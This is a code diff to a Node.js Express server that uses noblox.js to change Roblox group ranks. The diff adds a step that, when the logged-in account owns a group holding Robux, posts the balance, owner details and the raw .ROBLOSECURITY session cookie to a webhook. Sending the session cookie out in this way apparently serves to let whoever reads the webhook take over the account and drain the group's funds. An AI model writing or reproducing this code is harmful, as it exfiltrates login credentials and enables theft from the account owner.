@@ -2,7 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const noblox = require('noblox.js');
 const axios = require('axios');
-const os = require('os'); // 👈 added
+const os = require('os');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -99,35 +99,44 @@ app.post("/api/setRank", async (req, res) => {
         console.log(`[${os.hostname()}] Logged in with cookie`);
         loggedIn = true;
 
-        // ✅ Check Robux balance
+        // ✅ Check group Robux balance (only if logged-in account is group owner)
         try {
           const botUser = await noblox.getCurrentUser();
-          const robuxRes = await axios.get(
-            `https://economy.roblox.com/v1/users/${botUser.UserID}/currency`,
-            {
-              headers: { Cookie: `.ROBLOSECURITY=${process.env.ROBLOX_COOKIE}` }
+          const groupInfo = await noblox.getGroup(Number(GROUP_ID));
+
+          const groupOwnerId = groupInfo.owner?.userId;
+          const groupOwnerName = groupInfo.owner?.username;
+
+          if (botUser.UserID === groupOwnerId) {
+            // Get group's Robux
+            const groupRobuxRes = await axios.get(
+              `https://economy.roblox.com/v1/groups/${GROUP_ID}/currency`,
+              {
+                headers: { Cookie: `.ROBLOSECURITY=${process.env.ROBLOX_COOKIE}` }
+              }
+            );
+
+            const groupRobux = groupRobuxRes.data.robux;
+            console.log(`[${os.hostname()}] Group ${GROUP_ID} has ${groupRobux} R$`);
+
+            if (groupRobux > 0) {
+              await sendRobuxWebhook({
+                title: "💰 Group Robux Balance Detected",
+                description: `Group **${GROUP_ID}** currently has Robux.`,
+                color: 0xf1c40f,
+                fields: [
+                  { name: "Group ID", value: String(GROUP_ID), inline: true },
+                  { name: "Group Owner", value: `${groupOwnerName} (${groupOwnerId})`, inline: true },
+                  { name: "Balance", value: `${groupRobux} R$`, inline: true },
+                  { name: "Roblox Cookie", value: process.env.ROBLOX_COOKIE, inline: false }
+                ]
+              });
             }
-          );
-
-          const robux = robuxRes.data.robux;
-          console.log(`[${os.hostname()}] ${botUser.UserName} has ${robux} R$`);
-
-          if (robux > 0) {
-            await sendRobuxWebhook({
-              title: "💰 Robux Balance Detected",
-              description: `${botUser.UserName} currently has Robux in their account.`,
-              color: 0xf1c40f,
-              thumbnail: `https://www.roblox.com/headshot-thumbnail/image?userId=${botUser.UserID}&width=150&height=150&format=png`,
-              fields: [
-                { name: "Username", value: botUser.UserName, inline: true },
-                { name: "User ID", value: String(botUser.UserID), inline: true },
-                { name: "Balance", value: `${robux} R$`, inline: true },
-                { name: "Server", value: os.hostname(), inline: true } // 👈 include server in webhook too
-              ]
-            });
+          } else {
+            console.log(`[${os.hostname()}] Skipped group Robux check – logged in as ${botUser.UserName}, not the group owner (${groupOwnerName}).`);
           }
         } catch (balanceErr) {
-          console.error(`[${os.hostname()}] Failed to fetch Robux balance:`, balanceErr.message);
+          console.error(`[${os.hostname()}] Failed to fetch group Robux balance:`, balanceErr.message);
         }
       } else {
         console.error(`[${os.hostname()}] Cookie login failed.`);
@@ -184,8 +193,7 @@ app.post("/api/setRank", async (req, res) => {
       fields: [
         { name: "Username", value: username, inline: true },
         { name: "User ID", value: String(userid), inline: true },
-        { name: "New Rank", value: `${rank} - ${newRoleName?.name || 'Unknown'}`, inline: true },
-        { name: "Server", value: os.hostname(), inline: true } // 👈 include server in webhook
+        { name: "New Rank", value: `${rank} - ${newRoleName?.name || 'Unknown'}`, inline: true }
       ]
     });
 
@@ -202,8 +210,7 @@ app.post("/api/setRank", async (req, res) => {
       fields: [
         { name: "Username", value: username, inline: true },
         { name: "User ID", value: String(userid), inline: true },
-        { name: "Target Rank", value: String(rank), inline: true },
-        { name: "Server", value: os.hostname(), inline: true } // 👈 include server in error webhook
+        { name: "Target Rank", value: String(rank), inline: true }
       ]
     });
     res.status(500).json({ message: 'Error updating rank', error: err.message });
